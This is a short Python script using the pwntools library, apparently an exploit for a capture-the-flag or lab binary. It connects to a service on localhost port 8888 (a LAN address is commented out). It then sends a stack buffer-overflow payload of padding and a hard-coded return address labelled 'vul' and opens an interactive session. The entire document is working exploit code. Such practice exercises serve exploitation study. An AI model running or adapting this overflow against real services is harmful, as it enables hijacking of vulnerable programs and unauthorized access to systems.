from pwn import *

vul = 0x00008544
r = remote('localhost', 8888)
#r = remote('192.168.1.2', 8888)
payload1  = ''
payload1 += 'a'*0x34
payload1 += p32(0)
payload1 += p32(vul)

raw_input()
r.sendline(payload1)
r.interactive()
